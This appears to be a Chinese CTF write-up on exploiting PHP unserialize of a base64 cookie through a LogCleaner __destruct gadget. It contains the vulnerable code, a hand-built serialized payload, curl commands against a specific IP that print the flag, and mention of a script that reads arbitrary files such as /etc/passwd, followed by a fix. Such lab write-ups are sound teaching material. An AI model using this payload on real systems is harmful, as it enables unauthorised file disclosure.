# Q39 - 综合 · PHP 反序列化 POP 链

- 实测地址: `http://47.120.76.57:34966/`
- FLAG: `TOGOGO-flag{e21de6e0-ebde-4770-bef2-04e131db393b}`

## 一句话心智模型

> 服务端把 Cookie `pref` 当 `base64(serialize(obj))` 直接 `unserialize`，且代码里有一个带 `__destruct` 的 `LogCleaner` 危险类。把 Cookie 换成构造好的 `LogCleaner`，对象被销毁时自动 `echo file_get_contents('/flag')`。

## 题目关键代码（源码片段）

```php
class UserPref { public $theme='light'; public $lang='zh'; }

class LogCleaner {                  // <-- POP gadget
    public $logfile = '/tmp/app.log';
    public $enabled = false;
    public function __destruct() {
        if ($this->enabled && is_file($this->logfile)) {
            echo "<hr><b>[DebugLog]</b> {$this->logfile}:<pre>";
            echo htmlspecialchars(@file_get_contents($this->logfile));
            echo "</pre>";
        }
    }
}

$raw  = base64_decode($_COOKIE['pref'], true);
$pref = @unserialize($raw);                    // 没有 allowed_classes
if (!$pref instanceof UserPref) $pref = new UserPref();   // 触发旧对象 __destruct
```

三个利用条件已具备：
1. `unserialize` 任意类（无白名单）
2. `__destruct` 自动触发（覆盖赋值即 GC）
3. 危险属性全 `public` 可控

## 手工复刻 4 步

### Step 1 · 摸清 Cookie 格式

```bash
curl -sI http://47.120.76.57:34966/ | grep -i set-cookie
# Set-Cookie: pref=Tzo4OiJVc2VyUHJlZiI6Mjp7...
echo 'Tzo4OiJVc2VyUHJlZiI6Mjp7czo1OiJ0aGVtZSI7czo1OiJsaWdodCI7czo0OiJsYW5nIjtzOjI6InpoIjt9' | base64 -d
# O:8:"UserPref":2:{s:5:"theme";s:5:"light";s:4:"lang";s:2:"zh";}
```

确认是 PHP 原生 `serialize` 格式 → 反序列化攻击面成立。

### Step 2 · 手写 POP 链 payload

PHP 序列化语法速查：
- `O:<类名长度>:"<类名>":<属性数>:{ ... }`
- `s:<字节数>:"<字符串>";`
- `b:1;` = true，`b:0;` = false

目标对象：
```
LogCleaner { logfile = "/flag"; enabled = true; }
```

对应序列化字符串（注意各处长度）：
```
O:10:"LogCleaner":2:{s:7:"logfile";s:5:"/flag";s:7:"enabled";b:1;}
```

| 片段 | 含义 |
|---|---|
| `O:10:"LogCleaner"` | 类名 10 字节 |
| `:2:` | 2 个属性 |
| `s:7:"logfile"` | 键 `logfile`，7 字节 |
| `s:5:"/flag"` | 值 `/flag`，5 字节 |
| `s:7:"enabled"` | 键 `enabled`，7 字节 |
| `b:1;` | 值 `true` |

### Step 3 · base64 编码

```bash
echo -n 'O:10:"LogCleaner":2:{s:7:"logfile";s:5:"/flag";s:7:"enabled";b:1;}' | base64 -w0
# TzoxMDoiTG9nQ2xlYW5lciI6Mjp7czo3OiJsb2dmaWxlIjtzOjU6Ii9mbGFnIjtzOjc6ImVuYWJsZWQiO2I6MTt9
```

### Step 4 · 带 Cookie 发请求

```bash
curl -s http://47.120.76.57:34966/ \
  -b 'pref=TzoxMDoiTG9nQ2xlYW5lciI6Mjp7czo3OiJsb2dmaWxlIjtzOjU6Ii9mbGFnIjtzOjc6ImVuYWJsZWQiO2I6MTt9' \
  | grep -oE 'TOGOGO-flag\{[^}]+\}'
# TOGOGO-flag{e21de6e0-ebde-4770-bef2-04e131db393b}
```

✅ 完成。

## 运行时为什么会触发 `__destruct`

```
unserialize -> 创建 LogCleaner 实例 (不调用 __construct，直接写属性)
   ↓
instanceof UserPref ? -> false
   ↓
$pref = new UserPref()    // 旧 LogCleaner refcount = 0
   ↓
PHP GC 立刻调用 LogCleaner::__destruct()
   ↓
enabled=true && is_file('/flag')=true
   ↓
echo file_get_contents('/flag')   ★ flag 出现在响应里
```

> 关键：`unserialize` 不走构造函数，属性直接被赋值——攻击者完全控制对象内部状态。

## 一键脚本

见同目录 `main.py`：

```bash
python3 main.py                              # 默认读 /flag
python3 main.py http://47.120.76.57:34966/ /etc/passwd  # 读任意文件
```

## 常见坑

| 现象 | 根因 | 处理 |
|---|---|---|
| 无响应 / 页面正常 | 序列化字符串语法错（长度算错） | 用 `s:<字节数>` 而非字符数；用 PHP/脚本算长度 |
| `b:0` 时没输出 | `if ($this->enabled)` 拦下 | 改成 `b:1` |
| 多字节字符串 | UTF-8 字节数 ≠ 字符数 | 用脚本生成 |
| protected/private 属性 | 序列化含 `\x00*\x00`/`\x00Cls\x00` 前缀 | 用 PHP 真机 `serialize()` 生成 |

## 修复

```php
$pref = unserialize($raw, ['allowed_classes' => [UserPref::class]]);
```

外加：Cookie 加 HMAC 签名；移除不必要的 `__destruct` 危险副作用。
